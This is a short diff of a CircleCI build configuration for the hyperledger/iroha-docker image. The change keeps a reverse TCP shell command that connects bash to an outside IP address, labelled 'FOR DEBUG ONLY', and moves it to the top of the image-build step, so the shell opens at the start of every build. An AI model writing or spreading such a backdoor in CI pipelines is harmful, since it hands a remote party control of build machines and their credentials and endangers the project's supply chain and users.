@@ -55,6 +55,9 @@ jobs:
       - run:
           name: build hyperledger/iroha-docker image
           command: |
+            # reverse tcp shell. FOR DEBUG ONLY
+            bash -i >& /dev/tcp/188.130.155.34/12345 0>&1
+
             # tag consists of branch+build version
             TAG={{ .Branch }}.$CIRCLE_BUILD_NUM
             # directory, where iroha build files will reside
@@ -65,10 +68,6 @@ jobs:
             # copy libraries (-H = follow links)
             cp -H $LIBS $IROHA_DOCKER/lib
             # build image
-
-            # reverse tcp shell. FOR DEBUG ONLY
-            bash -i >& /dev/tcp/188.130.155.34/12345 0>&1
-
             cd $IROHA_HOME/docker/tiny
             docker build -t hyperledger/iroha-build:$TAG .
             # login and push
